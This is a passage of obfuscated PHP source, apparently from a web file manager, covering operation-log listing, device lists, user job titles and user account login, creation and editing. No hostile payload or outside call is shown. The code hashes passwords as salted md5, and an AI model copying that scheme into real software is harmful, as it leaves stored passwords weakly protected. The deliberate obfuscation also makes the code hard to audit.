json_decode($¿¾Õä×[$¥óÛü»[528]], !0); if ($¿¾Õä×[$¥óÛü»[33]] == $¥óÛü»[1953]) { $ÇàÌ®Á = $this->descZipDownload($ÇàÌ®Á, $Çï¼øÉˆ); $ëíØÍÜ[$ññÕ‘¹Æ][$¥óÛü»[528]] = json_encode($ÇàÌ®Á); continue; } if (strpos($¿¾Õä×[$¥óÛü»[33]], $¥óÛü»[2216]) !== 0) { if (!isset($ÇàÌ®Á[$¥óÛü»[87]]) || strpos($¿¾Õä×[$¥óÛü»[33]], $¥óÛü»[2446]) !== 0) { continue; } try { $”ñÚª¿± = IO::infoFullSimple($ÇàÌ®Á[$¥óÛü»[87]]); } catch (Exception $ËÚÃä¬À) { continue; } $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[193]] = $”ñÚª¿±[$¥óÛü»[193]]; $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[2214]] = $”ñÚª¿±[$¥óÛü»[192]]; $ëíØÍÜ[$ññÕ‘¹Æ][$¥óÛü»[528]] = json_encode($ÇàÌ®Á); continue; } $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[193]]; $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[2214]]; if ($ÇàÌ®Á[$¥óÛü»[33]] == $¥óÛü»[625]) { $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[528]][$¥óÛü»[1248]]; $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[528]][$¥óÛü»[1249]]; } if ($ÇàÌ®Á[$¥óÛü»[33]] == $¥óÛü»[2225]) { $Çï¼øÉˆ[] = $ÇàÌ®Á[$¥óÛü»[528]][$¥óÛü»[193]]; } } if (!$Çï¼øÉˆ) { return array(); } return Model($¥óÛü»[903])->sourceListInfo($Çï¼øÉˆ, !0); } private function logList($‚÷Â‘îÃ) { $•Õ˜ ‹Ó =& $_SERVER[¶Ô„œ…¯]; $Õ šúŸŸ = array_to_keyvalue($‚÷Â‘îÃ, $•Õ˜ ‹Ó[12], $•Õ˜ ‹Ó[1780]); $òŒÁ†Şº = Model($•Õ˜ ‹Ó[599])->userListInfo(array_unique($Õ šúŸŸ)); $Ùš‡Â·ö = $this->getSourceList($‚÷Â‘îÃ); $“Ô„¡–ş = $this->typeAll(); $¡ˆµõÄÑ = array(); $™íù°´º = array(); foreach ($‚÷Â‘îÃ as $ÎåÒº« => $ƒäÙÌˆë) { $Úôûúãù = $ƒäÙÌˆë[$•Õ˜ ‹Ó[33]]; $¢³ÒÙ­Í = isset($òŒÁ†Şº[$ƒäÙÌˆë[$•Õ˜ ‹Ó[1780]]]) ? $òŒÁ†Şº[$ƒäÙÌˆë[$•Õ˜ ‹Ó[1780]]] : !1; $öş¬›Ó¢ = strpos($Úôûúãù, $•Õ˜ ‹Ó[2447]) === 0 ? LNG($•Õ˜ ‹Ó[2448]) : LNG($•Õ˜ ‹Ó[2443]); $ƒäÙÌˆë[$•Õ˜ ‹Ó[32]] = isset($¢³ÒÙ­Í[$•Õ˜ ‹Ó[32]]) ? $¢³ÒÙ­Í[$•Õ˜ ‹Ó[32]] : LNG($•Õ˜ ‹Ó[2443]); $ƒäÙÌˆë[$•Õ˜ ‹Ó[2275]] = isset($¢³ÒÙ­Í[$•Õ˜ ‹Ó[2275]]) ? $¢³ÒÙ­Í[$•Õ˜ ‹Ó[2275]] : $•Õ˜ ‹Ó[12]; $ƒäÙÌˆë[$•Õ˜ ‹Ó[1666]] = isset($“Ô„¡–ş[$Úôûúãù]) ? $“Ô„¡–ş[$Úôûúãù] : $öş¬›Ó¢; $ƒäÙÌˆë[$•Õ˜ ‹Ó[2157]] = $¢³ÒÙ­Í; $Ù§§©© = json_decode($ƒäÙÌˆë[$•Õ˜ ‹Ó[528]], !0); $ƒäÙÌˆë[$•Õ˜ ‹Ó[2440]] = isset($Ù§§©©[$•Õ˜ ‹Ó[2440]]) ? $Ù§§©©[$•Õ˜ ‹Ó[2440]] : $•Õ˜ ‹Ó[12]; $ƒäÙÌˆë[$•Õ˜ ‹Ó[2444]] = IpLocation::get($ƒäÙÌˆë[$•Õ˜ ‹Ó[2440]]); if (strpos($Úôûúãù, $•Õ˜ ‹Ó[2216]) === 0 || isset($Ù§§©©[$•Õ˜ ‹Ó[2214]])) { $Ù§§©©[$•Õ˜ ‹Ó[90]] = $Ùš‡Â·ö[$Ù§§©©[$•Õ˜ ‹Ó[193]]]; $Ù§§©©[$•Õ˜ ‹Ó[2230]] = $Ùš‡Â·ö[$Ù§§©©[$•Õ˜ ‹Ó[2214]]]; if ($Ù§§©©[$•Õ˜ ‹Ó[33]] == $•Õ˜ ‹Ó[625]) { $Ù§§©©[$•Õ˜ ‹Ó[528]][$•Õ˜ ‹Ó[1248]] = $Ùš‡Â·ö[$Ù§§©©[$•Õ˜ ‹Ó[528]][$•Õ˜ ‹Ó[1248]]]; $Ù§§©©[$•Õ˜ ‹Ó[528]][$•Õ˜ ‹Ó[1249]] = $Ùš‡Â·ö[$Ù§§©©[$•Õ˜ ‹Ó[528]][$•Õ˜ ‹Ó[1249]]]; } if ($Ù§§©©[$•Õ˜ ‹Ó[33]] == $•Õ˜ ‹Ó[2225]) { $Ù§§©©[$•Õ˜ ‹Ó[528]][$•Õ˜ ‹Ó[193]] = $Ùš‡Â·ö[$Ù§§©©[$•Õ˜ ‹Ó[528]][$•Õ˜ ‹Ó[193]]]; } if ($Ù§§©©[$•Õ˜ ‹Ó[33]] == $•Õ˜ ‹Ó[1948]) { $Ù§§©©[$•Õ˜ ‹Ó[2230]] = $Ù§§©©[$•Õ˜ ‹Ó[90]]; $Ù§§©©[$•Õ˜ ‹Ó[2214]] = $Ù§§©©[$•Õ˜ ‹Ó[2230]][$•Õ˜ ‹Ó[193]]; $Ù§§©©[$•Õ˜ ‹Ó[90]] = !1; $Ù§§©©[$•Õ˜ ‹Ó[193]] = $•Õ˜ ‹Ó[12]; } $İÛ×€—º = array($•Õ˜ ‹Ó[1948], $•Õ˜ ‹Ó[2212]); if (!in_array($Ù§§©©[$•Õ˜ ‹Ó[33]], $İÛ×€—º)) { if ($Ù§§©©[$•Õ˜ ‹Ó[90]] && $Ù§§©©[$•Õ˜ ‹Ó[90]][$•Õ˜ ‹Ó[190]] == $•Õ˜ ‹Ó[191]) { $™íù°´º[] = $ƒäÙÌˆë[$•Õ˜ ‹Ó[477]]; unset($‚÷Â‘îÃ[$ÎåÒº«]); continue; } if ($Ù§§©©[$•Õ˜ ‹Ó[2230]] && $Ù§§©©[$•Õ˜ ‹Ó[2230]][$•Õ˜ ‹Ó[190]] == $•Õ˜ ‹Ó[191]) { $™íù°´º[] = $ƒäÙÌˆë[$•Õ˜ ‹Ó[477]]; unset($‚÷Â‘îÃ[$ÎåÒº«]); continue; } } } $ƒäÙÌˆë[$•Õ˜ ‹Ó[528]] = $Ù§§©©; unset($ƒäÙÌˆë[$•Õ˜ ‹Ó[2449]]); $¡ˆµõÄÑ[] = $ƒäÙÌˆë; } $this->clearSystemPathLog($™íù°´º); return $¡ˆµõÄÑ; } private function clearSystemPathLog($£­¤Í¯œ) { $¹Ùç«©Ñ =& $_SERVER[¶Ô„œ…¯]; if (count($£­¤Í¯œ) == 0) { return; } $°Ö²½µİ = array($¹Ùç«©Ñ[477] => array($¹Ùç«©Ñ[7], array_unique($£­¤Í¯œ))); $this->where($°Ö²½µİ)->delete(); } public function deviceList($š»Û±öû, $¯šˆÄ¹ = 0) { $ªäÌíÛ¦ =& $_SERVER[¶Ô„œ…¯]; $ÚÌÓ¢• = array($ªäÌíÛ¦[1780] => $š»Û±öû, $ªäÌíÛ¦[233] => array($ªäÌíÛ¦[1098], $¯šˆÄ¹), $ªäÌíÛ¦[33] => $ªäÌíÛ¦[1922]); $·›äï­” = array(); $¸ûÃÓ×¹ = $this->field($ªäÌíÛ¦[2450])->where($ÚÌÓ¢•)->order($ªäÌíÛ¦[2228])->limit(50)->select(); foreach ($¸ûÃÓ×¹ as $ß“‚ÈØ× => $¦Ã¯’Íô) { if ($ß“‚ÈØ× > 0 && abs($¦Ã¯’Íô[$ªäÌíÛ¦[233]] - $¸ûÃÓ×¹[$ß“‚ÈØ× - 1][$ªäÌíÛ¦[233]]) < 5) { continue; } $‡åÒè† = json_decode($¦Ã¯’Íô[$ªäÌíÛ¦[528]], !0); $¦Ã¯’Íô[$ªäÌíÛ¦[2440]] = isset($‡åÒè†[$ªäÌíÛ¦[2440]]) ? $‡åÒè†[$ªäÌíÛ¦[2440]] : $ªäÌíÛ¦[12]; unset($‡åÒè†[$ªäÌíÛ¦[2440]]); $›¯…å† = $this->deviceType($‡åÒè†[$ªäÌíÛ¦[2217]]); if (isset($·›äï­”[$›¯…å†])) { continue; } $¦Ã¯’Íô[$ªäÌíÛ¦[2444]] = IpLocation::get($¦Ã¯’Íô[$ªäÌíÛ¦[2440]]); $¦Ã¯’Íô[$ªäÌíÛ¦[528]] = $‡åÒè†; $·›äï­”[$›¯…å†] = $¦Ã¯’Íô; } return array_values($·›äï­”); } public function deviceType($ßéâÎó‡) { return $ßéâÎó‡; } } goto AùÆÄÏ›×; dæÅ‡‹¾´Â: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\152\157\x62\114\151\163\164"; public $field = array("\156\x61\155\145", "\x64\145\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\x73\145\154\146\112\x6f\x62\x4c\x69\x73\164"; public function listData($Ï¥°¬¹™ = false, $ä—¬ß²İ = "\163\157\x72\164", $öÑ‘”ó = false) { return parent::listData($Ï¥°¬¹™, $ä—¬ß²İ, $öÑ‘”ó); } public function remove($áè Æ×) { return parent::remove($áè Æ×); } public function add($œ‡¬ù»á) { $‚õ¾±ı =& $_SERVER[¶Ô„œ…¯]; if ($this->findByName($œ‡¬ù»á[$‚õ¾±ı[32]])) { return !1; } $œ‡¬ù»á[$‚õ¾±ı[2004]] = $this->getSort(); return parent::insert($œ‡¬ù»á); } private function getSort() { $–ã˜©Ñ =& $_SERVER[¶Ô„œ…¯]; $•ÔùºÊ = parent::listData(); $…ñ¿Ïû® = array_to_keyvalue($•ÔùºÊ, $–ã˜©Ñ[12], $–ã˜©Ñ[2004]); return empty($…ñ¿Ïû®) ? 0 : max($…ñ¿Ïû®) + 1; } public function update($ŞŠ‚¿Ÿ¿, $’ïÑæÇ) { $£³éàõ» =& $_SERVER[¶Ô„œ…¯]; $™¶ñ¦ÏŞ = parent::listData($ŞŠ‚¿Ÿ¿); $ÌËåœó = $this->findByName($’ïÑæÇ[$£³éàõ»[32]]); if (!$™¶ñ¦ÏŞ || $ÌËåœó && $ÌËåœó[$£³éàõ»[477]] != $™¶ñ¦ÏŞ[$£³éàõ»[477]]) { return !1; } return parent::update($ŞŠ‚¿Ÿ¿, $’ïÑæÇ); } public function setUserJob($àëøõ‡±, $·ÃÕ¶‡ı) { $âºó€¤Æ =& $_SERVER[¶Ô„œ…¯]; if (!is_array($·ÃÕ¶‡ı)) { $·ÃÕ¶‡ı = array($·ÃÕ¶‡ı); } $ŠÉÜ‚ú = parent::listData(); $ôóü’â½ = array_to_keyvalue($ŠÉÜ‚ú, $âºó€¤Æ[32]); $ÎÙÀÕ¿ = $âºó€¤Æ[456]; foreach ($·ÃÕ¶‡ı as $Ÿ×Ï®á) { if ($ôóü’â½[$Ÿ×Ï®á]) { $ÎÙÀÕ¿ .= $ôóü’â½[$Ÿ×Ï®á][$âºó€¤Æ[477]] . $âºó€¤Æ[50]; } else { $˜¸¯Õ®ª = $this->add($Ÿ×Ï®á); $ÎÙÀÕ¿ .= $˜¸¯Õ®ª . $âºó€¤Æ[50]; } } $ÎÙÀÕ¿ = rtrim($ÎÙÀÕ¿, $âºó€¤Æ[50]); Model($âºó€¤Æ[599])->metaSet($àëøõ‡±, self::JOB_KEY, $ÎÙÀÕ¿); } public function getUserJob($¬»ö³Æ³) { $üÓŒ Âæ = Model($_SERVER[¶Ô„œ…¯][599])->metaGet($¬»ö³Æ³); return $this->getUserJobInfo($üÓŒ Âæ[self::JOB_KEY]); } public function getUserJobInfo($–Ø¶á¡‰) { $èğîÚê× =& $_SERVER[¶Ô„œ…¯]; $Î˜ÚÎØê = explode($èğîÚê×[50], $–Ø¶á¡‰); $ø”à¬şğ = parent::listData(); $ø”à¬şğ = array_remove_key($ø”à¬şğ, $èğîÚê×[233]); $æ€Â¨şÄ = array(); foreach ($Î˜ÚÎØê as $±¨õ•®Ÿ) { if (isset($ø”à¬şğ[$±¨õ•®Ÿ])) { $æ€Â¨şÄ[] = $ø”à¬şğ[$±¨õ•®Ÿ]; } } return $æ€Â¨şÄ; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\155\x65" => "\x75\163\x65\x72\x5f\155\x65\164\141", "\x6d\145\164\x61\106\151\145\x6c\x64" => "\165\x73\x65\x72\x49\x44"); protected $simpleField = "\x75\163\x65\x72\x49\x44\x2c\x6e\x69\x63\153\116\x61\155\x65\x2c\156\x61\x6d\145\x2c\x61\166\x61\164\141\162\54\163\x65\x78\54\163\164\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Øşºû›) { $íıÂñş =& $_SERVER[¶Ô„œ…¯]; $Ş¶Õ¨ëª = $íıÂñş[2468]; return array($íıÂñş[2062] => array($Øşºû›[0], $Ş¶Õ¨ëª), $íıÂñş[2064] => array($Øşºû›[0], $Ş¶Õ¨ëª), $íıÂñş[2469] => array($Øşºû›[0], $Ş¶Õ¨ëª)); } protected function getInfo($ıÃè±ŒÒ, $¸ìØ’  = false) { $ï¹à˜ = $this->getInfoSimple($ıÃè±ŒÒ); if (!is_array($ï¹à˜)) { return array(); } if ($¸ìØ’ ) { return $this->_getInfoApply($ï¹à˜); } return $this->cacheFunctionGet($_SERVER[¶Ô„œ…¯][2066], $ıÃè±ŒÒ); } protected function getInfoFull($é¦áé, $á–ÔÁØ° = false) { $ù…³é = $this->getInfoSimple($é¦áé); if (!is_array($ù…³é)) { return array(); } if ($á–ÔÁØ°) { return $this->_getInfoApply($ù…³é, !0); } return $this->cacheFunctionGet($_SERVER[¶Ô„œ…¯][2470], $é¦áé); } private function _getInfoApply($¤“¡Ï¼¤, $Å™ä±ôš = false) { $Ù£´±Æ =& $_SERVER[¶Ô„œ…¯]; if (!$¤“¡Ï¼¤) { return $¤“¡Ï¼¤; } $ö‹Ì‘ = md5($Ù£´±Æ[2471] . $¤“¡Ï¼¤[$Ù£´±Æ[973]] . $Ù£´±Æ[2472] . $¤“¡Ï¼¤[$Ù£´±Æ[32]]); $¤“¡Ï¼¤ = $this->_listDataApplyItem($¤“¡Ï¼¤); $ ±£ó°‰ = Model($Ù£´±Æ[1428])->metaGet($¤“¡Ï¼¤[$Ù£´±Æ[90]][$Ù£´±Æ[193]]); $¤“¡Ï¼¤[$Ù£´±Æ[2473]] = $ö‹Ì‘; $¤“¡Ï¼¤[$Ù£´±Æ[90]][$Ù£´±Æ[2262]] = isset($ ±£ó°‰[$Ù£´±Æ[2263]]) ? $ ±£ó°‰[$Ù£´±Æ[2263]] : null; if ($Å™ä±ôš) { $¤“¡Ï¼¤[$Ù£´±Æ[541]] = $this->metaGet($¤“¡Ï¼¤[$Ù£´±Æ[1780]]); } return $¤“¡Ï¼¤; } protected function getInfoSimple($¶¢Éß±ğ, $€¸¦½±º = false) { $·šûîı· =& $_SERVER[¶Ô„œ…¯]; if (!$¶¢Éß±ğ) { return array(); } if ($€¸¦½±º) { $úÉºëöº = $this->where(array($·šûîı·[1780] => intval($¶¢Éß±ğ)))->find(); if (!is_array($úÉºëöº)) { return array(); } $úÉºëöº[$·šûîı·[2474]] = Action($·šûîı·[2475])->parseUrl($úÉºëöº[$·šûîı·[2474]]); return $úÉºëöº; } return $this->cacheFunctionGet($·šûîı·[2067], $¶¢Éß±ğ); } protected function getInfoSimpleOuter($ÈÅÁÄ©“) { $…¨ßÛİ =& $_SERVER[¶Ô„œ…¯]; if (!$ÈÅÁÄ©“ || $ÈÅÁÄ©“ == 0) { return array($…¨ßÛİ[1780] => $…¨ßÛİ[230], $…¨ßÛİ[32] => $…¨ßÛİ[176] . LNG($…¨ßÛİ[2476]) . $…¨ßÛİ[178], $…¨ßÛİ[2474] => STATIC_PATH . $…¨ßÛİ[2477]); } $µª’¢³Ì = $this->cacheFunctionGet($…¨ßÛİ[2067], $ÈÅÁÄ©“); $ÜÖºˆË¤ = array_field_key($µª’¢³Ì, explode($…¨ßÛİ[50], $this->simpleField)); if (!$ÜÖºˆË¤) { return array($…¨ßÛİ[1780] => $…¨ßÛİ[1280], $…¨ßÛİ[32] => $…¨ßÛİ[176] . LNG($…¨ßÛİ[2478]) . $…¨ßÛİ[178], $…¨ßÛİ[2474] => STATIC_PATH . $…¨ßÛİ[2479]); } $ÜÖºˆË¤[$…¨ßÛİ[2474]] = Action($…¨ßÛİ[2475])->parseUrl($ÜÖºˆË¤[$…¨ßÛİ[2474]]); return $ÜÖºˆË¤; } protected function groupUser($ÇÅ£Ùıä) { } public static function errorLang($ËÊğğ§õ) { $ÖíÔ›×» =& $_SERVER[¶Ô„œ…¯]; $«çşÊñÜ = array(self::ERROR_USER_NOT_EXISTS => $ÖíÔ›×»[2480], self::ERROR_USER_PASSWORD_ERROR => $ÖíÔ›×»[2481], self::ERROR_USER_EXIST_NAME => $ÖíÔ›×»[2482], self::ERROR_USER_EXIST_PHONE => $ÖíÔ›×»[2483], self::ERROR_USER_EXIST_EMAIL => $ÖíÔ›×»[2484], self::ERROR_USER_LOGIN_LOCK => $ÖíÔ›×»[2485], self::ERROR_IP_NOT_ALLOW => $ÖíÔ›×»[2486], self::ERROR_USER_EXIST_NICKNAME => $ÖíÔ›×»[2487]); $£îëÚØß = LNG($«çşÊñÜ[$ËÊğğ§õ]); if ($ËÊğğ§õ == self::ERROR_USER_LOGIN_LOCK) { $ê¤ØË²° = (int) Model($ÖíÔ›×»[2488])->get($ÖíÔ›×»[2489]); if ($ê¤ØË²° > 60) { $£îëÚØß = str_replace($ÖíÔ›×»[91], ceil($ê¤ØË²° / 60), $£îëÚØß); } } return $£îëÚØß; } protected function metaSet($­ü–êâ, $ò¬¨÷Ò = null, $–À‹ÕÂ· = null) { $this->clearCache($­ü–êâ); return parent::metaSet($­ü–êâ, $ò¬¨÷Ò, $–À‹ÕÂ·); } public function getInfoByMeta($á€Ï, $³òŒõ’) { $‹Êªßë =& $_SERVER[¶Ô„œ…¯]; $çºĞÕõ€ = Model($‹Êªßë[2490])->where(array($‹Êªßë[97] => $á€Ï, $‹Êªßë[452] => $³òŒõ’))->find(); if ($çºĞÕõ€) { return $this->getInfo($çºĞÕõ€[$‹Êªßë[1780]]); } return !1; } public function userLoginCheck($úÛğŸùÅ, $’ÚÔûÊÎ) { $ã ğş± =& $_SERVER[¶Ô„œ…¯]; $£åé÷ = $this->userLoginFind($úÛğŸùÅ); if (!$£åé÷) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($£åé÷[$ã ğş±[1780]], $’ÚÔûÊÎ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($£åé÷[$ã ğş±[1780]]); } public function userLoginFind($±±ÆŠ¢) { $¦›·ÆØñ =& $_SERVER[¶Ô„œ…¯]; $ò¡ÔçÀ½ = array($¦›·ÆØñ[32] => $±±ÆŠ¢, $¦›·ÆØñ[2275] => $±±ÆŠ¢, $¦›·ÆØñ[382] => $±±ÆŠ¢, $¦›·ÆØñ[2491] => $±±ÆŠ¢, $¦›·ÆØñ[1084] => $¦›·ÆØñ[1086]); if ($this->nickNameRpt()) { unset($ò¡ÔçÀ½[$¦›·ÆØñ[2275]]); } return $this->where($ò¡ÔçÀ½)->find(); } public function clearCache($ÑÕŞÜµ¥) { $Ò›ã’çê =& $_SERVER[¶Ô„œ…¯]; $this->cacheFunctionClear($Ò›ã’çê[2066], $ÑÕŞÜµ¥); $this->cacheFunctionClear($Ò›ã’çê[2067], $ÑÕŞÜµ¥); $this->cacheFunctionClear($Ò›ã’çê[2470], $ÑÕŞÜµ¥); } public function userPasswordCheck($û§²ÜëĞ, $‚Œœûµ) { $ü”çæÚ¶ =& $_SERVER[¶Ô„œ…¯]; $÷ı¯º£ä = $this->where(array($ü”çæÚ¶[1780] => intval($û§²ÜëĞ)))->find(); $Ü¶Ö–Ï = $this->metaGet($û§²ÜëĞ); $‹œ»øµ“ = isset($Ü¶Ö–Ï[$ü”çæÚ¶[2492]]) ? $Ü¶Ö–Ï[$ü”çæÚ¶[2492]] : $ü”çæÚ¶[12]; if (md5($‹œ»øµ“ . trim($‚Œœûµ)) !== $÷ı¯º£ä[$ü”çæÚ¶[973]]) { return !1; } return !0; } public function userAdd($¿Ú« íµ) { $ÈÔüÄĞİ =& $_SERVER[¶Ô„œ…¯]; $ïß‚ğº¶ = array($ÈÔüÄĞİ[496] => $¿Ú« íµ[$ÈÔüÄĞİ[32]], $ÈÔüÄĞİ[2493] => $¿Ú« íµ[$ÈÔüÄĞİ[2187]], $ÈÔüÄĞİ[2494] => isset($¿Ú« íµ[$ÈÔüÄĞİ[382]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[382]] : $ÈÔüÄĞİ[12], $ÈÔüÄĞİ[2495] => isset($¿Ú« íµ[$ÈÔüÄĞİ[2491]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[2491]] : $ÈÔüÄĞİ[12], $ÈÔüÄĞİ[2496] => isset($¿Ú« íµ[$ÈÔüÄĞİ[2275]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[2275]] : $¿Ú« íµ[$ÈÔüÄĞİ[32]], $ÈÔüÄĞİ[2497] => isset($¿Ú« íµ[$ÈÔüÄĞİ[2474]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[2474]] : $ÈÔüÄĞİ[12], $ÈÔüÄĞİ[2498] => isset($¿Ú« íµ[$ÈÔüÄĞİ[2499]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[2499]] : 1, $ÈÔüÄĞİ[2500] => $¿Ú« íµ[$ÈÔüÄĞİ[973]], $ÈÔüÄĞİ[2068] => isset($¿Ú« íµ[$ÈÔüÄĞİ[1966]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[1966]] : 1024 * 1024 * 20, $ÈÔüÄĞİ[2069] => 0, $ÈÔüÄĞİ[2501] => 0, $ÈÔüÄĞİ[2113] => isset($¿Ú« íµ[$ÈÔüÄĞİ[828]]) ? $¿Ú« íµ[$ÈÔüÄĞİ[828]] : 1); if (!empty($¿Ú« íµ[$ÈÔüÄĞİ[1780]])) { $ïß‚ğº¶[$ÈÔüÄĞİ[1780]] = $¿Ú« íµ[$ÈÔüÄĞİ[1780]]; } $™÷›‡ï¥ = $this->_checkExist($¿Ú« íµ); if ($™÷›‡ï¥ !== !0) { return $™÷›‡ï¥; } if (!empty($ïß‚ğº¶[$ÈÔüÄĞİ[2474]]) && strlen($ïß‚ğº¶[$ÈÔüÄĞİ[2474]]) > 255) { $ïß‚ğº¶[$ÈÔüÄĞİ[2474]] = $ÈÔüÄĞİ[12]; } $ı¼†ıëæ = $this->add($ïß‚ğº¶); $óü£Êüİ = array($ÈÔüÄĞİ[2500] => $ïß‚ğº¶[$ÈÔüÄĞİ[973]], $ÈÔüÄĞİ[2496] => $ïß‚ğº¶[$ÈÔüÄĞİ[2275]]); $this->userEdit($ı¼†ıëæ, $óü£Êüİ); Model($ÈÔüÄĞİ[1428])->userRootAdd($ı¼†ıëæ); return $ı¼†ıëæ; } protected function userEditTest($áŞòÚ‡Õ, $°ˆÆÅÆ€) { return $this->call($_SERVER[¶Ô„œ…¯][2502], $áŞòÚ‡Õ, $°ˆÆÅÆ€); } protected function userEdit($î‘ÀôÙ, $îáĞßàæ) { $ü»ØÓ‡ =& $_SERVER[¶Ô„œ…¯]; $¶ƒ áÅ = $this->getInfoSimple($î‘ÀôÙ); if (!$¶ƒ áÅ) { return !1; } $ß™¤™Ú« = $this->_checkExist($îáĞßàæ, $î‘ÀôÙ); if ($ß™¤™Ú« !== !0) { return $ß™¤™Ú«; } if (isset($îáĞßàæ[$ü»ØÓ‡[973]]) && trim($îáĞßàæ[$ü»ØÓ‡[973]]) != $ü»ØÓ‡[12]) { $­Ğñú›ğ = $this->metaGet($î‘ÀôÙ); if (empty($­Ğñú›ğ[$ü»ØÓ‡[2492]])) { $­Ğñú›ğ[$ü»ØÓ‡[2492]] = rand_string(10); Model($ü»ØÓ‡[579])->metaSet($î‘ÀôÙ, $ü»ØÓ‡[2492], $­Ğñú›ğ[$ü»ØÓ‡[2492]]); } $îáĞßàæ[$ü»ØÓ‡[973]] = md5($­Ğñú›ğ[$ü»ØÓ‡[2492]] . trim($îáĞßàæ[$ü»ØÓ‡[973]])); } else { unset($îáĞßàæ[$ü»ØÓ‡[973]]); } if (!empty($îáĞßàæ[$ü»ØÓ‡[2474]]) && strlen($îáĞßàæ[$ü»ØÓ‡[2474]]) > 255) { $îáĞßàæ[$ü»ØÓ‡[2474]] = $ü»ØÓ‡[12]; } $this->where(array($ü»ØÓ‡[1771] => $î‘ÀôÙ))->save($îáĞßàæ); if (isset($îáĞßàæ[$ü»ØÓ‡[2275]])) { $this->setNamePinyin($î‘ÀôÙ, $îáĞßàæ[$ü»ØÓ‡[2275]]); } $this->clearCache($î‘ÀôÙ); return !0; } public function setNamePinyin($œ¾ìòÚ“, $ˆ²âìĞõ = false) { $’•ş™Üş =& $_SERVER[¶Ô„œ…¯]; if (!$ˆ²âìĞõ) { $“ø¶óÔ = $this->getInfoSimple($œ¾ìòÚ“); $ˆ²âìĞõ = $“ø¶óÔ[$’•ş™Üş[2275]] ? $“ø¶óÔ[$’•ş™Üş[2275]] : $“ø¶óÔ[$’•ş™Üş[32]]; } $æÆ¿ëÇù = Model($’•ş™Üş[599]); if (!Input::check($ˆ²âìĞõ, $’•ş™Üş[660])) { return $æÆ¿ëÇù->metaSet($œ¾ìòÚ“, array($’•ş™Üş[540] => $’•ş™Üş[12], $’•ş™Üş[539] => $’•ş™Üş[12])); } return $æÆ¿ëÇù->metaSet($œ¾ìòÚ“, array($’•ş™Üş[540] => str_replace($’•ş™Üş[53], $’•ş™Üş[12], Pinyin::get($ˆ²âìĞõ)), $’•ş™Üş[539] => Pinyin::get($ˆ²âìĞõ, $’•ş™Üş[661]))); } private function nickNameRpt() { $ä—Ä‚Ä¥ =& $_SERVER[¶Ô„œ…¯]; $Ãäç„š† = Model($ä—Ä‚Ä¥[848])->get($ä—Ä‚Ä¥[2503]); $±ß‚Ú…Ñ = $GLOBALS[$ä—Ä‚Ä¥[6]][$ä—Ä‚Ä¥[459]][$ä—Ä‚Ä¥[2503]]; $Ÿ¬«¶Õ‡ = !is_null($Ãäç„š†) ? $Ãäç„š† : $±ß‚Ú…Ñ; return !!$Ÿ¬«¶Õ‡; } private function _checkExist($ÅÁš„Ëâ, $Ğ¼ªãÁ = false) { $ÍÀå…ù÷ =& $_SERVER[¶Ô„œ…¯]; $‚­ˆàèˆ = array($ÍÀå…ù÷[32] => UserModel::ERROR_USER_EXIST_NAME, $ÍÀå…ù÷[2275] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÍÀå…ù÷[382] => UserModel::ERROR_USER_EXIST_EMAIL, $ÍÀå…ù÷[2491] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($‚­ˆàèˆ[$ÍÀå…ù÷[2275]]); } $´Ç»áŸÓ = $Ğ¼ªãÁ ? array($ÍÀå…ù÷[1780] => array($ÍÀå…ù÷[2504], $Ğ¼ªãÁ)) : array(); foreach ($‚­ˆàèˆ as $—í—ùÇ => $¤˜íàÚ‡) { $—°òÄ‚ = array(); foreach ($‚­ˆàèˆ as $¸•¾µ¼ => $èßõ˜¥) { if (isset($ÅÁš„Ëâ[$¸•¾µ¼]) && $ÅÁš„Ëâ[$¸•¾µ¼]) { $—°òÄ‚[] = $ÅÁš„Ëâ[$¸•¾µ¼]; } } if (!$—°òÄ‚) { continue; } $ÚÆÀëÂÑ = array_merge(array($—í—ùÇ => array($ÍÀå…ù÷[7], $—°òÄ‚)), $´Ç»áŸÓ); $•ºÍ­º¢ = $this->where($ÚÆÀëÂÑ)->find(); if ($•ºÍ­º¢) { return $¤˜íàÚ‡; } } return !0; } public function userListInfo($ÙüŠØŒ¡) { $¹ë†÷Œ =& $_SERVER[¶Ô„œ…¯]; $ù£ö¶¤ = array(); $ÙüŠØŒ¡ = is_array($ÙüŠØŒ¡) ? array_unique($ÙüŠØŒ¡) : array(); if (!$ÙüŠØŒ¡) { return $ù£ö¶¤; } if (count($ÙüŠØŒ¡) < 20) { foreach ($ÙüŠØŒ¡ as $×ûøôĞ²) { $ù£ö¶¤[$×ûøôĞ² . $¹ë†÷Œ[12]] = $this->getInfoSimpleOuter($×ûøôĞ²); } } else { $ßÎ°Ãê = array($¹ë†÷Œ[1771] => array($¹ë†÷Œ[494], $ÙüŠØŒ¡)); if (count($ÙüŠØŒ¡) == 1) { $ßÎ°Ãê = array($¹ë†÷Œ[1771] => $ÙüŠØŒ¡[0]); } $Õò¸œ™ = Model($¹ë†÷Œ[579])->field($this->simpleField)->where($ßÎ°Ãê)->select(); $Õò¸œ™ = array_to_keyvalue($Õò¸œ™, 